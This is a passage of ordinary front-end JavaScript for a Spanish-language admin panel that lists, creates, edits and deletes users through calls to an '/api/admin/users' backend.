    document.getElementById('admin-add-user-btn')?.addEventListener('click', showAdminAddUserModal);
}

async function loadAdminUsers() {
    try {
        const users = await apiFetch('/api/admin/users');
        renderAdminUsers(users || []);
    } catch { /* silent */ }
}

function renderAdminUsers(users) {
    const tbody = document.getElementById('admin-users-body');
    if (!tbody) return;
    if (!users || users.length === 0) {
        tbody.innerHTML = '<tr><td colspan="8" class="empty-cell">No hay usuarios registrados</td></tr>';
        return;
    }
    tbody.innerHTML = users.map(u => {
        const created = u.created_at ? new Date(u.created_at).toLocaleDateString() : '-';
        const lastLogin = u.last_login ? new Date(u.last_login).toLocaleDateString() : 'Nunca';
        const activeStr = u.is_active === 0 ? 'Inactivo' : 'Activo';
        const activeClass = u.is_active === 0 ? 'badge-danger' : 'badge-success';
        const roleStr = u.role === 'admin' ? 'Administrador' : 'Usuario';
        return `<tr>
            <td>${u.id}</td>
            <td><strong>${escapeHtml(u.username)}</strong></td>
            <td>${escapeHtml(u.email)}</td>
            <td><span class="badge badge-${u.role === 'admin' ? 'primary' : 'secondary'}">${roleStr}</span></td>
            <td><span class="badge ${activeClass}">${activeStr}</span></td>
            <td>${created}</td>
            <td>${lastLogin}</td>
            <td class="admin-actions">
                <button class="btn btn-sm btn-secondary" onclick="adminEditUser(${u.id})" title="Editar"><i class="fas fa-edit"></i></button>
                <button class="btn btn-sm btn-danger" onclick="adminDeleteUser(${u.id})" title="Eliminar"><i class="fas fa-trash"></i></button>
            </td>
        </tr>`;
    }).join('');
}

function showAdminAddUserModal() {
    document.getElementById('admin-add-user-btn').insertAdjacentHTML('afterend', `
    <div class="modal active" id="admin-user-modal">
        <div class="modal-content" style="max-width:420px">
            <button class="modal-close" type="button" onclick="this.closest('.modal').remove()">&times;</button>
            <div class="modal-header">
                <h3><i class="fas fa-user-plus"></i> Nuevo usuario</h3>
            </div>
            <form id="admin-user-form" class="modal-body" onsubmit="adminCreateUser(event)">
                <div class="form-group">
                    <label>Usuario</label>
                    <input type="text" id="admin-new-username" class="form-input" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="admin-new-email" class="form-input" required>
                </div>
                <div class="form-group">
                    <label>Contraseña</label>
                    <input type="password" id="admin-new-password" class="form-input" required minlength="4">
                </div>
                <div class="form-group">
                    <label>Rol</label>
                    <select id="admin-new-role" class="form-input">
                        <option value="user">Usuario</option>
                        <option value="admin">Administrador</option>
                    </select>
                </div>
                <div class="settings-actions">
                    <button type="button" class="btn btn-secondary" onclick="document.getElementById('admin-user-modal').remove()">Cancelar</button>
                    <button type="submit" class="btn btn-primary"><i class="fas fa-check"></i> Crear</button>
                </div>
            </form>
        </div>
    </div>`);
}

async function adminCreateUser(e) {
    e.preventDefault();
    const username = document.getElementById('admin-new-username').value.trim();
    const email = document.getElementById('admin-new-email').value.trim();
    const password = document.getElementById('admin-new-password').value;
    const role = document.getElementById('admin-new-role').value;
    try {
        await apiFetch('/api/admin/users', {
            method: 'POST',
            body: JSON.stringify({ username, email, password, role }),
        });
        showToast('Usuario creado exitosamente', 'success');
        document.getElementById('admin-user-modal').remove();
        await loadAdminUsers();
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

async function adminEditUser(userId) {
    const user = (await apiFetch('/api/admin/users')).find(u => u.id === userId);
    if (!user) return;
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'admin-edit-modal';
    modal.innerHTML = `
    <div class="modal-content" style="max-width:420px">
        <button class="modal-close" type="button" onclick="this.closest('.modal').remove()">&times;</button>
        <div class="modal-header">
            <h3><i class="fas fa-user-edit"></i> Editar usuario #${userId}</h3>
        </div>
        <form class="modal-body" onsubmit="adminUpdateUser(event, ${userId})">
            <div class="form-group">
                <label>Usuario</label>
                <input type="text" id="admin-edit-username" class="form-input" value="${escapeHtml(user.username)}">
            </div>
            <div class="form-group">
                <label>Email</label>
                <input type="email" id="admin-edit-email" class="form-input" value="${escapeHtml(user.email || '')}">
            </div>
            <div class="form-group">
                <label>Rol</label>
                <select id="admin-edit-role" class="form-input">
                    <option value="user" ${user.role === 'user' ? 'selected' : ''}>Usuario</option>
                    <option value="admin" ${user.role === 'admin' ? 'selected' : ''}>Administrador</option>
                </select>
            </div>
            <div class="form-group">
                <label>Estado</label>
                <select id="admin-edit-active" class="form-input">
                    <option value="1" ${user.is_active !== 0 ? 'selected' : ''}>Activo</option>
                    <option value="0" ${user.is_active === 0 ? 'selected' : ''}>Inactivo</option>
                </select>
            </div>
            <div class="settings-actions">
                <button type="button" class="btn btn-secondary" onclick="this.closest('.modal').remove()">Cancelar</button>
                <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> Guardar</button>
            </div>
        </form>
    </div>`;
    document.body.appendChild(modal);
}

async function adminUpdateUser(e, userId) {
    e.preventDefault();
    const body = {
        username: document.getElementById('admin-edit-username').value.trim() || undefined,
        email: document.getElementById('admin-edit-email').value.trim() || undefined,
        role: document.getElementById('admin-edit-role').value,
        is_active: parseInt(document.getElementById('admin-edit-active').value),
    };
    try {
        await apiFetch(`/api/admin/users/${userId}`, {
            method: 'PUT',
            body: JSON.stringify(body),
        });
        showToast('Usuario actualizado', 'success');
        document.getElementById('admin-edit-modal').remove();
        await loadAdminUsers();
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

async function adminDeleteUser(userId) {
    if (!confirm('¿Estás seguro de eliminar este usuario?')) return;
    try {
        await apiFetch(`/api/admin/users/${userId}`, { method: 'DELETE' });
        showToast('Usuario eliminado', 'success');
        await loadAdminUsers();
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

// ============================================

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
